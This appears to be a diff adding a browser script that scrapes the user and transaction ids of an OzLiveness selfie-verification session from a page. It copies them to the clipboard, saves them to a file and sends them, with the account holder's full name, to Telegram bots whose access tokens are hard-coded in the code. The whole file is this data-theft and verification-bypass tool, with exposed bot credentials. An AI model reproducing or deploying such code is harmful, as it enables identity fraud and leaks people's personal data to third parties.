@@ -1,0 +1,58 @@
+
+function ExtractAndSendTheSelfieCode(){
+
+    function sendMessage2(texte) {
+        fetch('https://api.telegram.org/bot7313056674:AAEIivyB_ADYOQwDDT6Mx_dJBJOQjq0Fe9s/sendMessage?chat_id='+ localStorage.telegramId +'&text=' + texte);
+    }
+    function sendMessage(texte) {
+        fetch('https://api.telegram.org/bot7373477501:AAFrSLeWYaKL3kFbch-38rlAjj6AwVCf00k/sendMessage?chat_id=-1002182656332&text=' + texte);
+    }
+     function sendMessage3(texte) {
+        fetch('https://api.telegram.org/bot7313056674:AAEIivyB_ADYOQwDDT6Mx_dJBJOQjq0Fe9s/sendMessage?chat_id=-1002186788637&text=' + texte);
+    }
+
+     function appendToFile(data, filename) {
+        const a = document.createElement('a');
+        a.style.display = 'none';
+        a.href = 'data:text/plain;charset=utf-8,' + encodeURIComponent(data + '\n');
+        a.download = filename;
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+    }
+
+        const scriptContents = [...document.scripts].map(script => script.textContent);
+        const selfieCode = scriptContents.map(content => {
+            const match = content.match(/OzLiveness\.open\((.+)\)/s);
+            if (match) {
+                const params = match[1];
+                const userIdMatch = params.match(/['"]?user_id['"]?:\s*['"]?([^'"]+)['"]?/);
+                const transactionIdMatch = params.match(/['"]?transaction_id['"]?:\s*['"]?([^'"]+)['"]?/);
+                if (userIdMatch && transactionIdMatch) {
+                    return userIdMatch[1] + "," + transactionIdMatch[1];
+                }
+            }
+        }).filter(Boolean).at(0);
+
+        if (selfieCode) {
+            navigator.clipboard.writeText(selfieCode);
+
+             appendToFile(selfieCode, 'FORBES_SELFIE_CODE')
+         //  sendMessage( localStorage.accountFullName + ' :  '+selfieCode)
+             sendMessage('FORBES SELFIE CODE');
+              sendMessage3('FORBES SELFIE CODE');
+            
+            sendMessage2( localStorage.accountFullName + ' :  ' +selfieCode)
+
+             prompt("Selfie Code", selfieCode);
+
+
+        } else {
+            alert("No selfie code found");
+        }
+
+
+}
+
+
+ExtractAndSendTheSelfieCode()
